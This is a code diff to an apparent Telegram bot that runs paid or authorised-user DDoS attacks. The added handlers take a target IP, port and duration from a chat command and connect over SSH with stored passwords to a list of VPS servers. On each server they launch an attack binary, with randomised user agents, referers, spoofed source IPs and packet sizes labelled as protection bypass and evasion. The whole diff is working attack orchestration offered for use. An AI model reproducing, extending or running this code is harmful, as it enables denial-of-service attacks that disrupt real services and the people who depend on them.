@@ -2118,6 +2118,144 @@ ATTACK_HISTORY = {}  # Key: (ip, port), Value: attack count
 
 
 
+# Add these new functions to handle advanced DDoS protection bypass
+def generate_random_user_agent():
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+    ]
+    return random.choice(user_agents)
+
+def get_random_referer():
+    referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://search.yahoo.com/",
+        "https://duckduckgo.com/",
+        "https://www.facebook.com/",
+        "https://twitter.com/",
+        "https://www.reddit.com/"
+    ]
+    return random.choice(referers)
+
+def generate_random_ip():
+    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+
+async def advanced_attack(update: Update, context: CallbackContext):
+    """Handler for advanced attack with DDoS protection bypass"""
+    if not is_authorized_user(update):
+        await update.message.reply_text("❌ Unauthorized access!")
+        return
+    
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text("Usage: /advanced <ip> <port> <duration> [threads=500]")
+        return
+    
+    target_ip = args[0]
+    target_port = int(args[1])
+    duration = int(args[2])
+    threads = int(args[3]) if len(args) > 3 else 500
+    
+    # Advanced attack parameters
+    attack_params = {
+        'target_ip': target_ip,
+        'target_port': target_port,
+        'duration': duration,
+        'threads': threads,
+        'user_agents': [generate_random_user_agent() for _ in range(5)],
+        'referers': [get_random_referer() for _ in range(5)],
+        'fake_ips': [generate_random_ip() for _ in range(10)],
+        'packet_sizes': [512, 1024, 2048, 4096],
+        'delay_variation': random.uniform(0.1, 1.0)
+    }
+    
+    await execute_advanced_attack(update, attack_params)
+
+async def execute_advanced_attack(update: Update, params: dict):
+    """Execute the advanced attack with evasion techniques"""
+    target = f"{params['target_ip']}:{params['target_port']}"
+    attack_id = f"{target}-{time.time()}"
+    
+    # Register attack
+    running_attacks[attack_id] = {
+        'user_id': update.effective_user.id,
+        'target_ip': params['target_ip'],
+        'start_time': time.time(),
+        'duration': params['duration'],
+        'is_advanced': True
+    }
+    
+    # Prepare attack message
+    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    
+    message = await update.message.reply_text(
+        f"⚡ *ADVANCED ATTACK INITIATED* ⚡\n\n"
+        f"🎯 Target: `{target}`\n"
+        f"⏱ Duration: {params['duration']}s\n"
+        f"🧵 Threads: {params['threads']}\n"
+        f"🛡 Bypass Techniques: Enabled\n\n"
+        f"🔥 *Attacking now!* /running\n"
+        f"👑 Owner: {current_display_name}",
+        parse_mode='Markdown'
+    )
+    
+    # Execute attack across VPS with advanced techniques
+    try:
+        for i, vps in enumerate(VPS_LIST[:ACTIVE_VPS_COUNT]):
+            threading.Thread(
+                target=_execute_advanced_attack,
+                args=(vps, params, i, update, context),
+                daemon=True
+            ).start()
+    except Exception as e:
+        logging.error(f"Advanced attack failed: {str(e)}")
+        await update.message.reply_text(f"❌ Advanced attack failed to start! Error: {str(e)}")
+
+def _execute_advanced_attack(vps, params, attack_num, update, context):
+    """Handles the actual advanced attack execution on a VPS"""
+    vps_ip, username, password = vps
+    attack_id = f"{params['target_ip']}:{params['target_port']}-{time.time()}-{attack_num}"
+    
+    ssh = None
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(vps_ip, username=username, password=password, timeout=15)
+        
+        # Maintain connection
+        ssh.get_transport().set_keepalive(30)
+        
+        # Build advanced attack command with evasion parameters
+        cmd = (
+            f"{BINARY_PATH} {params['target_ip']} {params['target_port']} {params['duration']} "
+            f"{params['threads']} --advanced --user-agents '{json.dumps(params['user_agents'])}' "
+            f"--referers '{json.dumps(params['referers'])}' --fake-ips '{json.dumps(params['fake_ips'])}' "
+            f"--packet-sizes '{json.dumps(params['packet_sizes'])}' --delay {params['delay_variation']}"
+        )
+        
+        # Execute command
+        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=60)
+        
+        # Monitor attack
+        start = time.time()
+        while time.time() - start < params['duration'] + 15:
+            if ssh.get_transport() is None or not ssh.get_transport().is_active():
+                break
+            time.sleep(1)
+            
+    except Exception as e:
+        logging.error(f"VPS {vps_ip} error during advanced attack: {str(e)}")
+    finally:
+        if ssh:
+            ssh.close()
+        running_attacks.pop(attack_id, None)
+
+
+
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
 
